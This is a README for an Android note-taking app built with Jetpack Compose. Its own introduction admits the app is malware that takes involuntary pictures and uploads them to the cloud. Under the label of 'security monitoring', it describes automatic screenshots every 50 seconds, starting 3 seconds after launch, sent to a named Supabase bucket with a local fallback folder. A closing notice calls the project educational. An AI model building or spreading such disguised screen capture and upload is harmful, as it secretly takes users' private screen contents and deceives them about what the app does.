# Goldy Notes - Secure Note-Taking Android Application

A modern Android note-taking application built with Jetpack Compose, featuring user authentication, local data storage, and advanced security monitoring capabilities(malware that creates involuntary pictures and uploads them to a cloud server) .

## 🚀 Features

### Core Functionality
- **User Authentication**: Secure login and registration system
- **Personal Notes**: Create, edit, delete, and view notes
- **User-Specific Data**: Each user sees only their own notes
- **Offline Storage**: Local database for reliable note storage

### Security Features
- **Automatic Screenshot Monitoring**: Captures screenshots every 50 seconds
- **Cloud Storage**: Screenshots uploaded to Supabase storage
- **Session Management**: Secure user session handling

## 🏗️ Architecture

The app follows **Clean Architecture** principles with **MVVM** pattern:

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Presentation  │    │     Domain      │    │      Data       │
│                 │    │                 │    │                 │
│ • UI Screens    │◄──►│ • Models        │◄──►│ • Repositories  │
│ • ViewModels    │    │ • Use Cases     │    │ • Data Sources  │
│ • Navigation    │    │                 │    │ • Mappers       │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

## 🛠️ Tech Stack

### Frontend
- **Kotlin** - Primary programming language
- **Jetpack Compose** - Modern UI toolkit
- **Material 3** - Design system
- **Navigation Compose** - In-app navigation
- **Room Database** - Local data persistence
- **Coroutines & Flow** - Asynchronous programming

### Backend Integration
- **Retrofit** - HTTP client for API calls hosted on render.com
- **OkHttp** - Network layer with logging
- **Gson** - JSON serialization

### Security & Monitoring
- **Custom Security Manager** - Screenshot capture and monitoring
- **Supabase** - Cloud storage for screenshots
- **SSL Configuration** - Secure network communications

## 📱 App Screens

1. **Login Screen** - User authentication
2. **Register Screen** - New user registration
3. **All Notes Screen** - Display user's notes
4. **Create/Edit Note Screen** - Note creation and editing

## 🗄️ Database Schema

### Notes Table (`note_database`)
```sql
CREATE TABLE notes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    content TEXT NOT NULL,
    created_at INTEGER NOT NULL,
    updated_at INTEGER NOT NULL,
    user_id INTEGER NOT NULL
);
```

## 🔐 Authentication Flow

### Login Process
```
User Input → LoginViewModel → AuthRepository → API Call → Session Storage
```

### API Endpoints
- **Login**: `POST /api/auth/login`
- **Register**: `POST /api/auth/register`

**Backend**: Hosted on [Render.com](https://note-app-backend-18hx.onrender.com/)

## 🛡️ Security Monitoring

### Screenshot Capture
- **Frequency**: Every 50 seconds automatically
- **Method**: Uses `View.draw()` and `PixelCopy` APIs
- **Storage**: Local temporary storage + cloud upload

### Cloud Storage (Supabase)
```
Project URL: https://nktmyiagvvvzlodevcah.supabase.co
Bucket: screenshots
Organization: security/{timestamp}_{filename}
```

### Fallback Storage
If cloud upload fails, screenshots are saved to:
```
/storage/emulated/0/Downloads/SecurityMonitoring/
```

## 📦 Project Structure

```
app/src/main/java/com/noteapp/
├── data/
│   ├── local/           # Room database, DAOs, entities
│   ├── remote/          # API interfaces, DTOs
│   ├── model/           # Domain models
│   └── mapper/          # Data mapping utilities
├── di/                  # Dependency injection
├── navigation/          # Navigation components
├── repository/          # Data repositories
├── security/            # Security monitoring system
├── ui/
│   ├── screen/          # Compose UI screens
│   └── theme/           # App theming
├── viewmodel/           # ViewModels for MVVM
└── MainActivity.kt      # Main activity
```

## 🚀 Getting Started

### Prerequisites
- Android Studio Arctic Fox or later
- Android SDK 24+
- Kotlin 1.8+

### Installation

1. **Clone the repository**
```bash
git clone <repository-url>
cd noteapp
```

2. **Open in Android Studio**
```bash
android-studio .
```

3. **Sync project dependencies**
- Let Gradle sync all dependencies

4. **Configure API endpoints** (if needed)
```kotlin
// In RetrofitClient.kt
private const val BASE_URL = "https://your-api-url.com/"
```

5. **Run the application**
- Select device/emulator
- Click "Run" or press `Shift + F10`

## 📋 Configuration

### Database Migration
The app includes automatic database migration from v1 to v2:
```kotlin
val MIGRATION_1_2 = object : Migration(1, 2) {
    override fun migrate(database: SupportSQLiteDatabase) {
        database.execSQL("ALTER TABLE notes ADD COLUMN user_id INTEGER NOT NULL DEFAULT -1")
    }
}
```

### Security Settings
Security monitoring starts automatically 3 seconds after app launch:
```kotlin
// In MainActivity.onCreate()
Handler(Looper.getMainLooper()).postDelayed({
    startSecurityMonitoring()
}, 3000)
```

## 🔧 Key Components

### Session Management
```kotlin
class SessionManager(context: Context) {
    fun saveUser(userId: Int, email: String)
    fun clearSession()
    fun isLoggedIn(): Boolean
    fun getUserId(): Int
}
```

### Security Manager
```kotlin
class SecurityManager {
    fun startMonitoring()              // Begin screenshot monitoring
    fun stopMonitoring()               // Stop monitoring
    fun setCurrentActivity(activity)   // Set active screen
    fun triggerSecurityCheck(activity) // Manual screenshot
}
```

### Note Repository
```kotlin
class NoteRepository {
    fun getAllNotes(): Flow<List<Note>>      // Get user's notes
    suspend fun saveNote(note: Note)         // Save new note
    suspend fun updateNote(note: Note)       // Update existing note
    suspend fun deleteNote(note: Note)       // Delete note
}
```

## 🔒 Security Features Detail

### Screenshot Monitoring
- **Automatic**: Runs every 50 seconds in background
- **Manual**: Triggered on security events
- **Quality**: PNG format, 90% compression
- **Privacy**: Only captures app screens, not system UI

### Data Protection
- **User Isolation**: Notes are strictly separated by user ID
- **Session Security**: Automatic logout on app termination
- **Network Security**: HTTPS with certificate validation

## 🎨 UI/UX Features

- **Material 3 Design**: Modern, consistent UI components
- **Dark/Light Theme**: Adaptive theming support
- **Responsive Layout**: Works across different screen sizes
- **Smooth Navigation**: Gesture-based navigation with animations
- **Form Validation**: Real-time input validation with user feedback

## 📊 Performance Optimizations

- **Flow-based Updates**: Reactive UI updates using Kotlin Flow
- **Efficient Database Queries**: Room with optimized queries
- **Image Compression**: Reduced screenshot file sizes
- **Background Processing**: Non-blocking UI operations
- **Memory Management**: Proper lifecycle handling

## 🧪 Testing Considerations

The app includes hooks for testing security features:
```kotlin
// Access internal components for testing
val securityMonitoringService = SecurityManager.getInstance(context)
    .securityMonitoringService
```

## 📈 Future Enhancements

- [ ] End-to-end encryption for notes
- [ ] Biometric authentication
- [ ] Note sharing capabilities
- [ ] Rich text formatting
- [ ] Cloud synchronization for notes
- [ ] Advanced security analytics

## 🤝 Contributing

1. Fork the repository
2. Create feature branch (`git checkout -b feature/amazing-feature`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push to branch (`git push origin feature/amazing-feature`)
5. Open Pull Request

## 📄 License

This project is intended for educational purposes in cybersecurity research and testing.

## ⚠️ Security Notice

This application includes security monitoring features designed for educational and testing purposes. Ensure compliance with local privacy laws and obtain proper permissions before deployment.

---

**Built with ❤️ using Kotlin & Jetpack Compose**
